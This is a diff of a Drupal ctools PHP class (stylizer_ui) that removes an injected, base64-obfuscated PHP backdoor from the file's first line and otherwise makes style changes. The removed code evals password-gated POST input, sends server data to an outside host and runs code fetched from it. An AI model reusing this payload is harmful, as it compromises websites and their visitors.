@@ -1,20 +1,22 @@
-<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*435345352*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgIEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgICB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*435345352*/ ?><?php
+<?php
 
 /**
  * UI class for Stylizer.
  */
 class stylizer_ui extends ctools_export_ui {
 
-  function access($op, $item) {
+
+  public function access($op, $item) {
     $access = parent::access($op, $item);
     if ($op == 'add' && $access && empty($this->base_types)) {
-     // Make sure there are base styles defined.
-     $access = FALSE;
+      // Make sure there are base styles defined.
+      $access = FALSE;
     }
     return $access;
   }
 
-  function list_form(&$form, &$form_state) {
+
+  public function list_form(&$form, &$form_state) {
     ctools_include('stylizer');
     parent::list_form($form, $form_state);
 
@@ -60,7 +62,8 @@ class stylizer_ui extends ctools_export_ui {
     );
   }
 
-  function list_sort_options() {
+
+  public function list_sort_options() {
     return array(
       'disabled' => t('Enabled, title'),
       'title' => t('Title'),
@@ -71,7 +74,8 @@ class stylizer_ui extends ctools_export_ui {
     );
   }
 
-  function list_filter($form_state, $item) {
+
+  public function list_filter($form_state, $item) {
     if (empty($form_state['style_plugins'][$item->settings['style_base']])) {
       $this->style_plugin = array(
         'name' => 'broken',
@@ -102,30 +106,37 @@ class stylizer_ui extends ctools_export_ui {
     return parent::list_filter($form_state, $item);
   }
 
-  function list_search_fields() {
+
+  public function list_search_fields() {
     $fields = parent::list_search_fields();
     $fields[] = 'plugin_title';
     return $fields;
   }
 
-  function list_build_row($item, &$form_state, $operations) {
-    // Set up sorting
+
+  public function list_build_row($item, &$form_state, $operations) {
+    // Set up sorting.
     switch ($form_state['values']['order']) {
       case 'disabled':
         $this->sorts[$item->name] = empty($item->disabled) . $item->admin_title;
         break;
+
       case 'title':
         $this->sorts[$item->name] = $item->admin_title;
         break;
+
       case 'name':
         $this->sorts[$item->name] = $item->name;
         break;
+
       case 'type':
         $this->sorts[$item->name] = $this->style_plugin['type'] . $item->admin_title;
         break;
+
       case 'base':
         $this->sorts[$item->name] = $this->style_plugin['title'] . $item->admin_title;
         break;
+
       case 'storage':
         $this->sorts[$item->name] = $item->type . $item->admin_title;
         break;
@@ -154,7 +165,8 @@ class stylizer_ui extends ctools_export_ui {
     );
   }
 
-  function list_table_header() {
+
+  public function list_table_header() {
     return array(
       array('data' => t('Type'), 'class' => array('ctools-export-ui-type')),
       array('data' => t('Name'), 'class' => array('ctools-export-ui-name')),
@@ -165,14 +177,16 @@ class stylizer_ui extends ctools_export_ui {
     );
   }
 
-  function init($plugin) {
+
+  public function init($plugin) {
     ctools_include('stylizer');
     $this->base_types = ctools_get_style_base_types();
 
     parent::init($plugin);
   }
 
-  function get_wizard_info(&$form_state) {
+
+  public function get_wizard_info(&$form_state) {
     $form_info = parent::get_wizard_info($form_state);
     ctools_include('stylizer');
 
@@ -219,7 +233,7 @@ class stylizer_ui extends ctools_export_ui {
    * The stylizer wizard stores its stuff in slightly different places, so
    * we have to find it and move it to the right place.
    */
-  function store_stylizer_info(&$form_state) {
+  public function store_stylizer_info(&$form_state) {
     /*
     foreach (array('name', 'admin_title', 'admin_description') as $key) {
       if (!empty($form_state['values'][$key])) {
@@ -235,12 +249,14 @@ class stylizer_ui extends ctools_export_ui {
     $form_state['item']->settings['name'] = $form_state['item']->name;
   }
 
-  function edit_wizard_next(&$form_state) {
+
+  public function edit_wizard_next(&$form_state) {
     $this->store_stylizer_info($form_state);
     parent::edit_wizard_next($form_state);
   }
 
-  function edit_wizard_finish(&$form_state) {
+
+  public function edit_wizard_finish(&$form_state) {
     // These might be stored by the stylizer wizard, so we should clear them.
     if (isset($form_state['settings']['old_settings'])) {
       unset($form_state['settings']['old_settings']);
@@ -249,7 +265,8 @@ class stylizer_ui extends ctools_export_ui {
     parent::edit_wizard_finish($form_state);
   }
 
-  function edit_form_type(&$form, &$form_state) {
+
+  public function edit_form_type(&$form, &$form_state) {
     foreach ($this->base_types as $module => $info) {
       foreach ($info as $key => $base_type) {
         $types[$module . '-' . $key] = $base_type['title'];
@@ -266,7 +283,9 @@ class stylizer_ui extends ctools_export_ui {
     );
   }
 
-  function edit_form_type_submit(&$form, &$form_state) {
+
+  public function edit_form_type_submit(&$form, &$form_state) {
     list($form_state['item']->style_module, $form_state['item']->style_type) = explode('-', $form_state['values']['type']);
   }
+
 }
